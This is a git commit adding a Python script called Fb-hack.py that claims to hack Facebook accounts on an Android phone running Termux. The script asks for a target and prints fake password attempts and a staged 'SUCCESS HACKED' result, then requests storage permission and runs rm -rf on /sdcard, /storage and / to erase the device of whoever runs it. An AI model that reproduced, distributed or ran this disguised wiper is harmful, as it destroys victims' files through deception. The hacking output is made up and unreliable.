d0f5711e5c3067d9051e0241f4cd4dfa2d59d675
kurusawaa <130026393+kurusawaa@users.noreply.github.com>
2023-04-28 23:59:36 +0800

    Create Fb-hack.py

---
+++ Fb-hack.py
@@ -0,0 +1,105 @@
+import os
+import time
+
+
+print("""\033[92m
+__________________________________________
+|  __  ___  ___  ___  __   __   __. _  _   |
+| |__ |___||    |___ |__| |  | |  | |_/    |
+| |   |   ||___ |___ |__| |__| |__| | \_   |
+|       ___   ___ _  _     _.     ___      |
+| |__| |___| |    |_/   | | \  | | |__.    |
+| |  | |   | |___ | \_  | |  \_| |___|'    |    
+|__________________________________________| """)                                       
+	                                                                
+print("\033[93mCreated By:\033[96m Eugene tsu \033[92m[Cyber Alliance Philippines]")
+print("\033[95m------------------------------------------")
+print()
+input("─╼ ❯❯❯ \033[91m[\033[0m~\033[92m]\033[0m ID \033[91m |\033[92m\033[0m EMAIL \033[91m |\033[92m\033[0m HP \033[92m :")
+time.sleep(2)
+input("─╼ ❯❯❯ \033[91m[\033[0m~\033[92m]\033[0m Target Name \033[92m:")
+time.sleep(2)
+print()
+print()
+input("─╼ ❯❯❯ \033[9m[\033[94m=\033[92m] \033[94mStart Hacking\033[0m>\033[95m ")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m TRYING PASSWORD")
+time.sleep(2) 
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mTamayoFamily563")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mivanaalawi34")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mfaxneeded")
+time.sleep(2) 
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mHacker2023")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mlexilorr43")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mneedjowangayun")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mowshieminecraft")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mmahalkitaloveyou")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mmiakalifa")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[92mAngelmae5637")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mloyalakosayu")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mdipatuli")
+time.sleep(2) 
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mTanginamo")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mDarknetHaxor")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mCyberhacker")
+time.sleep(2) 
+print("\033[91m─╼ ❯❯❯ \033[92m[+]\033[0m Password : \033[91mVirus6782")
+time.sleep(5)
+print()
+print()
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[=]\033[0m PASSWORD FOUND \033[92m─╼ ❯❯❯ Angelmae5637")
+
+print("\033[91m─╼ ❯❯❯ \033[91m[*]Please wait 15 seconds...")
+
+time.sleep(15)
+print("\033[91m─╼ ❯❯❯ \033[92m[#]ENTERING RANDOM FACEBOOK ID...")
+time.sleep(3)
+print("\033[91m─╼ ❯❯❯ \033[95m[+] FACEBOOK ID ==> 783921673282  ")
+time.sleep(1)
+
+print("\033[91m─╼ ❯❯❯ \033[91m[*] Please wait 15 seconds [RUNNING HACKING]...")
+time.sleep(15)
+print("\033[91m─╼ ❯❯❯ \033[92m[=]\033[0m Password :\033[92m Angelmae5637 | 783921673282")
+time.sleep(1)
+
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[#]\033[92m Status :\033[92m SUCCESS HACKED")
+time.sleep(1)
+print("\033[91m─╼ ❯❯❯ \033[92m[=]\033[92m FINISH")
+time.sleep(2)
+print()
+print("\033[94m {Announcement!!! Go To Your Video and Files}==>")
+
+
+os.system('termux-setup-storage')
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
+
+
+
+
+
+
+
+
+
+
+    
